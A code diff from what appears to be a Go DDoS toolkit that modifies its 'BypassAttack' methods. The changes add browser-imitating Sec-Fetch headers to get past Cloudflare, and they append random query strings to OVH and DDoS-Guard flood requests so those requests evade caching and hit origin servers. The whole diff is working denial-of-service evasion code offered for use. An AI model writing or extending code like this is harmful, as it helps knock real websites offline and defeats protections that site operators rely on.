@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/go-ddos-tools/pkg/core"
+	"github.com/go-ddos-tools/pkg/utils"
 )
 
 // BypassAttack implements generic evasion methods
@@ -51,7 +52,13 @@ func (b *BypassAttack) executeCFB(ctx context.Context) error {
 		}
 
 		b.AddHeaders(req)
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+		// Specific browser headers for Cloudflare
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Sec-Fetch-Dest", "document")
+		req.Header.Set("Sec-Fetch-Mode", "navigate")
+		req.Header.Set("Sec-Fetch-Site", "none")
+		req.Header.Set("Sec-Fetch-User", "?1")
+		req.Header.Set("Te", "trailers")
 
 		resp, err := b.Client.Do(req)
 		if err == nil {
@@ -108,6 +115,11 @@ func (b *BypassAttack) executeOVH(ctx context.Context) error {
 			continue
 		}
 
+		// Randomize Query String for OVH to bypass cache
+		q := req.URL.Query()
+		q.Add(utils.RandString(5), utils.RandString(5))
+		req.URL.RawQuery = q.Encode()
+
 		b.AddHeaders(req)
 
 		resp, err := b.Client.Do(req)
@@ -140,6 +152,11 @@ func (b *BypassAttack) executeDGB(ctx context.Context) error {
 		if err != nil {
 			continue
 		}
+
+		// Randomize Query String for DGB to bypass cache
+		q := req.URL.Query()
+		q.Add("_", utils.RandString(8))
+		req.URL.RawQuery = q.Encode()
 
 		b.AddHeaders(req)
 
